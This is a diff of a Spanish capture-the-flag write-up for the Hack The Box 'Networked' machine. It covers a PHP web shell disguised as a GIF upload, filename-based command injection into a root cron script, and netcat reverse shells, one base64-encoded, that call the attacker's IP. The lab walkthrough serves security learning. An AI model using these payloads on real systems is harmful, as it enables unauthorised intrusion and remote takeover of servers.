@@ -1,4 +1,7 @@
 10.10.10.146 - Networked
+
+![Networked](https://user-images.githubusercontent.com/96772264/197965145-d3fd5d23-d00c-4a9d-b593-83cd42cf33b3.png)
+
 ------------------------
 
 # Part 1: Enumeración
@@ -21,7 +24,6 @@ Join us at the pool party this Sat to get a glimpse
 > Tyler&Cameron: modelo participante en el "Hombres Mujeres & Vicebersa" americano 
 > FaceMash: red social ilegal para puntuar cual era la estudiante mas sexy de Harvard
 
-
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.146/FUZZ/
 000000021:   403        8 L      22 W       210 Ch      "cgi-bin"                                            
@@ -39,17 +41,17 @@ Join us at the pool party this Sat to get a glimpse
 # Part 2: Web shell via File upload
 
 /backup
-Tenemos el archivo backup.tar donde sale el codigo de todos esos phps que hemos encontrado.
-Conclusiones
-- Los archivos se suben a /uploads (/var/www/html/uploads/)
-- Metodo /POST parametros: myFile (archivo), submit.
-- Pone los permisos 644: (read write (propietario)   read(grupo)   read(otros))
-- El archivo a subir tiene que cumplir los requisitos de no ser muy grande y tener una extension de imagen.
-- Encima le cambia el nombre
+Tenemos el archivo backup.tar donde sale el codigo de todos esos phps que hemos encontrado. Conclusiones:  
+- Los archivos se suben a /uploads (/var/www/html/uploads/)  
+- Metodo /POST parametros: myFile (archivo), submit.  
+- Pone los permisos 644: (read write (propietario)   read(grupo)   read(otros))  
+- El archivo a subir tiene que cumplir los requisitos de no ser muy grande y tener una extension de imagen.  
+- Encima le cambia el nombre  
 
-Por tanto para burlar esto se le pone doble extension (para que verifique solo la segunda) y cabecera de GIF8 por
-los magic numbers:
-> **magic numbers**: primeros bits que determinan que clase de archivo tenemos
+![networked2](https://user-images.githubusercontent.com/96772264/197965379-185ce95b-18e9-4910-8cac-8ddadac7133d.PNG)
+
+Por tanto para burlar esto se le pone doble extension (para que verifique solo la segunda) y cabecera de GIF8 por los magic numbers:  
+> **magic numbers**: primeros bits que determinan que clase de archivo tenemos  
 ```php
 GIF8;
 <?php echo "<pre>" . cmd_exec($_REQUEST['cmd']) . "</pre>";?>
@@ -59,12 +61,12 @@ GIF8;
 └─$ curl -s -X POST http://10.10.10.146/upload.php -d 'myFile=@cmd.php.jpg&submit=go!'
 ```
 
-Si nos vamos a /images.php y vemos de donde viene una imagen viene de ```/uploads/127_0_0_4.png```
-es decir quita el nombre y lo cambia por una IP.
+Si nos vamos a /images.php y vemos de donde viene una imagen viene de ```/uploads/127_0_0_4.png``` es decir quita el nombre y lo cambia por una IP.  
 
-Si subimos una foto normal al servidor (la misma de centos) la ruta es ```/uploads/10_10_14_15.png```
-Subimos la nuestra (cmd.php.jpg) por la web en vez de por curl y ya funciona (se ve en la galeria)
-Copiando su ruta y haciendo una peticion tenemos que:
+![networked1](https://user-images.githubusercontent.com/96772264/197965421-e8b9ea78-7540-4942-b7cc-cf28a99183c4.PNG)
+
+Si subimos una foto normal al servidor (la misma de centos) la ruta es ```/uploads/10_10_14_15.png``` Subimos la nuestra (cmd.php.jpg) por la web en vez de por
+curl y ya funciona (se ve en la galeria) Copiando su ruta y haciendo una peticion tenemos que:  
 
 ```console
 └─$ curl -s http://10.10.10.146/uploads/10_10_14_15.php.jpg?cmd=whoami                       
@@ -88,12 +90,12 @@ bash-4.2$ curl -O http://10.10.14.15:8000/lin_info_xii.sh
 bash-4.2$ chmod +x ./lin_info_xii.sh
 ```
 
-- Somos apache, los otros usaurios son root y guly
-- SUIDs -> pam_timestamp_check, unix_chkpwd, usernetctl, chage, pkexec, crontab, sudo
-- /var/mail/guly -> tendra algo?
-- Estan corriendo estos procesos: /usr/bin/python2 -Es /usr/sbin/tuned -l -P, /usr/sbin/rsyslogd -n
+- Somos apache, los otros usaurios son root y guly  
+- SUIDs -> pam_timestamp_check, unix_chkpwd, usernetctl, chage, pkexec, crontab, sudo  
+- /var/mail/guly -> tendra algo?  
+- Estan corriendo estos procesos: ```/usr/bin/python2 -Es /usr/sbin/tuned -l -P, /usr/sbin/rsyslogd -n```
 
-Ninguno de los SUIDs nos sirven pero;
+Ninguno de los SUIDs nos sirven pero; 
 ```console
 bash-4.2$ ls -l /home
 total 4
@@ -110,40 +112,33 @@ bash-4.2$ cat crontab.guly
 ```
 Cada tres minutos se ejecuta eso por root, el problema esque no tenemos permiso se escritura, pero si de lectura.
 ```console
-<?php
-require '/var/www/html/lib.php';
+<?php 
+require '/var/www/html/lib.php';  // Reutiliza código de la web.
 $path = '/var/www/html/uploads/';
 $logpath = '/tmp/attack.log';
 $to = 'guly'; $msg= ''; $headers = "X-Mailer: check_attack.php\r\n";
-
 $files = array(); $files = preg_grep('/^([^.])/', scandir($path)); // Por cada archivo de la ruta /uploads 
-
-foreach ($files as $key => $value) { $msg='';
-  if ($value == 'index.html') { //
-	continue;
-  }
-  list ($name,$ext) = getnameCheck($value);
+foreach ($files as $key => $value) { $msg='';    
+  if ($value == 'index.html') { continue; }  
+  list($name,$ext) = getnameCheck($value);
   $check = check_ip($name,$value);
 
   if (!($check[0])) {   // Si detecta que es malicioso (o sea no hay una ip bien puesta)
     echo "attack!\n";
     file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
-    exec("rm -f $logpath");
+    exec("rm -f $logpath"); 
     exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &"); // ejecuta este comando
     echo "rm -f $path$value\n";
-    mail($to, $msg, $msg, $headers, "-F$value"); }}
-?>
+    mail($to, $msg, $msg, $headers, "-F$value"); }}?>
 ```
-Como ejecuta el comando bin/rm -f $path$value y tenemos control de $value (o sea el nombre del archivo),
-podemos ponerle un nombre malicioso como: ```test;whoami | nc 10.10.14.15 666``` haciendo que se concatenen
-dos comandos
-
+Como ejecuta el comando bin/rm -f $path$value y tenemos control de $value (o sea el nombre del archivo), podemos ponerle un nombre malicioso como: 
+```test;whoami | nc 10.10.14.15 666``` haciendo que se concatenen dos comandos.  
 ```console
 └─$ sudo nc -nlvp 666
-Ncat: Connection from 10.10.10.146:36746.
+Ncat: Connection from 10.10.10.146:36746.  
 guly
 ```
-La shell se cierra ```nc -e bash 10.10.14.15 666``` pero si se encodea eso en base64 
+La shell se cierra ```nc -e bash 10.10.14.15 666``` pero si se encodea eso en base64:
 ```; echo bmMgLWMgYmFzaCAxMC4xMC4xNC4xNSA2NjYK | base64 -d | bash```
 
 ----------------------------------
@@ -184,7 +179,6 @@ sad
 [root@networked network-scripts]# whoami
 root
 ```
-
 ---------------------------------------
 
 # Extra: Analizando el codigo
@@ -196,7 +190,6 @@ foreach (scandir($path) as $file) {
   if (in_array($file, $ignored)) continue;  //toma cada archivo salvo '.' '..' e 'index'
   $files[$file] = filemtime($path. '/' . $file); }
 ```
-
 Repliqué el codigo y me salió:
 ```php
 <?php
